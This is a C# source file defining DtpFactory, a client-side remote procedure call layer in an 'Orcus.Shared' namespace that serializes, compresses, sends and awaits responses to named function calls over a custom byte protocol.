using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using Orcus.Shared.Compression;
using Orcus.Shared.NetSerializer;

namespace Orcus.Shared.DataTransferProtocol
{
    public class DtpFactory
    {
        /// <summary>
        ///     Send the given data to the server
        /// </summary>
        /// <param name="data">The data to send. Do not modify it without restoring the original data</param>
        public delegate void SendDataAction(byte[] data);

        private readonly Dictionary<Guid, MethodCaller> _methodDictionary;
        private readonly Dictionary<Guid, byte[]> _methodResponses;
        private readonly Dictionary<Guid, Exception> _exceptionResponses;
        private readonly SendDataAction _sendDataAction;

        //creating serializer costs a lot of performance so we just cache some
        private readonly Dictionary<Type, Serializer> _serializers;

        private readonly Type[] _cachedSerializerTypes =
        {
            typeof (int), typeof (byte), typeof (short), typeof (ushort), typeof (sbyte), typeof (ushort),
            typeof (long), typeof (ulong), typeof (string), typeof (byte[]), typeof (Guid)
        };

        internal static readonly Guid ExceptionGuid = new Guid("37F5CC7B-E3D7-4BE5-806C-CBD761FAA01B");
        internal static readonly Guid FunctionNotFoundExceptionGuid = new Guid("510DE836-A1A1-4025-8534-43DF64E86ADB");

        /// <summary>
        ///     The <see cref="DtpFactory" /> is the execution module of the connection. This should be populated at the client's
        ///     side
        /// </summary>
        /// <param name="sendDataAction">The delegate to send data to a <see cref="DtpProcessor" /></param>
        public DtpFactory(SendDataAction sendDataAction)
        {
            _serializers = new Dictionary<Type, Serializer>();
            _sendDataAction = sendDataAction;
            _methodDictionary = new Dictionary<Guid, MethodCaller>();
            _methodResponses = new Dictionary<Guid, byte[]>();
            _exceptionResponses = new Dictionary<Guid, Exception>();
        }

        /// <summary>
        /// The timeout for each request in milliseconds
        /// </summary>
        public int Timeout { get; set; } = 150000;

        /// <summary>
        ///     Receive data from the server and process it
        /// </summary>
        /// <param name="data">The data received by the server</param>
        public void Receive(byte[] data)
        {
            Receive(data, 0);
        }

        /// <summary>
        ///     Receive data from the server and process it
        /// </summary>
        /// <param name="data">The data received by the server</param>
        /// <param name="position">The start position</param>
        public void Receive(byte[] data, int position)
        {
            data = LZF.Decompress(data, position);
            var guid = new Guid(data.Take(16).ToArray());

            MethodCaller methodCaller;

            if (guid == FunctionNotFoundExceptionGuid)
            {
                var sessionGuid = new Guid(data.Skip(16).Take(16).ToArray());
                if (!_methodDictionary.TryGetValue(sessionGuid, out methodCaller))
                    throw new InvalidOperationException("Session was not registered");

                _exceptionResponses.Add(sessionGuid, new InvalidOperationException(
                    $"Method or function with name {Encoding.UTF8.GetString(data, 32, data.Length - 32)} not found"));
                methodCaller.AutoResetEvent.Set();
                return;
            }

            if (guid == ExceptionGuid)
            {
                var errorReport = new Serializer(typeof (DtpException)).Deserialize<DtpException>(data, 16);

                if (!_methodDictionary.TryGetValue(errorReport.SessionGuid, out methodCaller))
                    throw new InvalidOperationException("Session was not registered");

                _exceptionResponses.Add(errorReport.SessionGuid, new ServerException(errorReport));
                methodCaller.AutoResetEvent.Set();
                return;
            }

            if (!_methodDictionary.TryGetValue(guid, out methodCaller))
                throw new InvalidOperationException("Session was not registered");

            var valueLength = BitConverter.ToInt32(data, 16);
            if (valueLength > 0)
            {
                var buffer = new byte[valueLength];
                Array.Copy(data, 20, buffer, 0, valueLength);
                _methodResponses.Add(guid, buffer);
            }

            methodCaller.AutoResetEvent.Set();
        }

        public string DescribeReceivedData(byte[] data, int position)
        {
            data = LZF.Decompress(data, position);
            var guid = new Guid(data.Take(16).ToArray());

            MethodCaller methodCaller;

            if (guid == FunctionNotFoundExceptionGuid)
            {
                var sessionGuid = new Guid(data.Skip(16).Take(16).ToArray());
                if (!_methodDictionary.TryGetValue(sessionGuid, out methodCaller))
                    return "Function not found (Session not registered)";

                return $"Function not found ({methodCaller.MethodName})";
            }

            if (guid == ExceptionGuid)
            {
                var errorReport = new Serializer(typeof(DtpException)).Deserialize<DtpException>(data, 16);

                if (!_methodDictionary.TryGetValue(errorReport.SessionGuid, out methodCaller))
                    return "Exception occurred (Session not registered)";

                return $"Exception occurred ({methodCaller.MethodName})";
            }

            if (!_methodDictionary.TryGetValue(guid, out methodCaller))
                return "Session not registered";

            return methodCaller.MethodName;
        }

        public static string DescribeSentData(byte[] data, int index)
        {
            data = LZF.Decompress(data, index);
            var functionNameLength = BitConverter.ToInt32(data, 16);
            var functionName = Encoding.UTF8.GetString(data, 20, functionNameLength);
            return functionName;
        }

        /// <summary>
        ///     Execute a function on the server
        /// </summary>
        /// <typeparam name="T">The response type</typeparam>
        /// <param name="functionName">The name of the function</param>
        /// <param name="parameters">The parameters of the function</param>
        /// <returns>Returns the response from the server</returns>
        public T ExecuteFunction<T>(string functionName, params object[] parameters)
        {
            return ExecuteFunction<T>(functionName, null, null, parameters);
        }

        /// <summary>
        ///     Execute a method on the server
        /// </summary>
        /// <param name="methodName">The name of the method</param>
        /// <param name="specialParameterTypes">
        ///     Types which aren't obvious (e. g. if abstract classes are used) for the parameter
        ///     in order to serialize it correctly
        /// </param>
        /// <param name="specialReturnTypes">
        ///     Types which aren't obvious (e. g. if abstract classes are used) for the response in
        ///     order to deserialize it correctly
        /// </param>
        /// <param name="parameters">The parameters of the method</param>
        public void ExecuteProcedure(string methodName, List<Type> specialParameterTypes, List<Type> specialReturnTypes,
            params object[] parameters)
        {
            ExecuteFunction<object>(methodName, specialParameterTypes, specialReturnTypes, parameters);
        }

        /// <summary>
        ///     Execute a method on the server
        /// </summary>
        /// <param name="methodName">The name of the method</param>
        /// <param name="parameters">The parameters of the method</param>
        public void ExecuteProcedure(string methodName, params object[] parameters)
        {
            ExecuteFunction<object>(methodName, null, null, parameters);
        }

        private Serializer GetCachedSerializer(Type type)
        {
            Serializer serializer;
            if (!_serializers.TryGetValue(type, out serializer))
                _serializers.Add(type, serializer = new Serializer(type));

            return serializer;
        }

        private Serializer GetSerializer(Type valueType, Type[] serializerTypes)
        {
            if (_cachedSerializerTypes.Contains(valueType))
                return GetCachedSerializer(valueType);

            return new Serializer(serializerTypes);
        }

        /// <summary>
        ///     Execute a function on the server
        /// </summary>
        /// <typeparam name="T">The response type</typeparam>
        /// <param name="functionName">The name of the function</param>
        /// <param name="specialParameterTypes">
        ///     Types which aren't obvious (e. g. if abstract classes are used) for the parameter
        ///     in order to serialize it correctly
        /// </param>
        /// <param name="specialReturnTypes">
        ///     Types which aren't obvious (e. g. if abstract classes are used) for the response in
        ///     order to deserialize it correctly
        /// </param>
        /// <param name="parameters">The parameters of the function</param>
        /// <returns>Returns the response from the server</returns>
        public T ExecuteFunction<T>(string functionName, List<Type> specialParameterTypes, List<Type> specialReturnTypes,
            params object[] parameters)
        {
            var methodGuid = Guid.NewGuid();
            while (methodGuid == ExceptionGuid || methodGuid == FunctionNotFoundExceptionGuid) //possibilities are everywhere
                methodGuid = Guid.NewGuid();

            var parameterData = new List<byte[]>();

            foreach (var parameter in parameters)
            {
                var parameterType = parameter.GetType();
                var types = new Type[1 + (specialParameterTypes?.Count ?? 0)];
                types[0] = parameterType;

                if (specialParameterTypes != null && specialParameterTypes.Count > 0)
                    for (int i = 0; i < specialParameterTypes.Count; i++)
                        types[i + 1] = specialParameterTypes[i];

                parameterData.Add(GetSerializer(parameterType, types).Serialize(parameter));
            }

            var functionNameData = Encoding.UTF8.GetBytes(functionName);
            var data =
                new byte[16 + 4 + functionNameData.Length + 4 + parameterData.Count*4 + parameterData.Sum(x => x.Length)
                    ];
            //Protocol
            //HEAD  - 16 Bytes                  - Guid
            //HEAD  - 4 Bytes                   - Function Name Length
            //HEAD  - UTF8(FunctionName).Length - Function Name
            //INFO  - 4 Bytes                   - Parameter count
            //PINF  - COUNT(Paramters)*4        - Information about the length of the parameters
            //DATA  - SUM(Parameters.Length)    - The parameter data

            Buffer.BlockCopy(methodGuid.ToByteArray(), 0, data, 0, 16);
            Buffer.BlockCopy(BitConverter.GetBytes(functionNameData.Length), 0, data, 16, 4);
            Buffer.BlockCopy(functionNameData, 0, data, 20, functionNameData.Length);
            Buffer.BlockCopy(BitConverter.GetBytes(parameters.Length), 0, data, 20 + functionNameData.Length, 4);
            for (int i = 0; i < parameterData.Count; i++)
            {
                Buffer.BlockCopy(BitConverter.GetBytes(parameterData[i].Length), 0, data, 24 + functionNameData.Length + i*4,
                    4);
            }

            int offset = 0;
            foreach (var parameter in parameterData)
            {
                Buffer.BlockCopy(parameter, 0, data, 24 + functionNameData.Length + parameterData.Count*4 + offset,
                    parameter.Length);
                offset += parameter.Length;
            }

            using (var autoResetEvent = new AutoResetEvent(false))
            {
                _methodDictionary.Add(methodGuid, new MethodCaller(functionName, autoResetEvent));
                _sendDataAction.Invoke(LZF.Compress(data, 0));
                if (!autoResetEvent.WaitOne(Timeout))
                    throw new InvalidOperationException("Timeout");

                _methodDictionary.Remove(methodGuid);

                Exception exception;
                if (_exceptionResponses.TryGetValue(methodGuid, out exception))
                {
                    _exceptionResponses.Remove(methodGuid);
                    throw exception;
                }

                byte[] response;
                if (_methodResponses.TryGetValue(methodGuid, out response))
                {
                    _methodResponses.Remove(methodGuid);
                    var types = new Type[1 + (specialReturnTypes?.Count ?? 0)];
                    types[0] = typeof (T);
                    if (specialReturnTypes != null && specialReturnTypes.Count > 0)
                        for (int i = 0; i < specialReturnTypes.Count; i++)
                            types[i + 1] = specialReturnTypes[i];

                    return GetSerializer(typeof (T), types).Deserialize<T>(response);
                }

                return default(T);
            }
        }
    }

    public struct MethodCaller
    {
        public MethodCaller(string methodName, AutoResetEvent autoResetEvent)
        {
            MethodName = methodName;
            AutoResetEvent = autoResetEvent;
        }

        public AutoResetEvent AutoResetEvent { get; }
        public string MethodName { get;  }
    }
}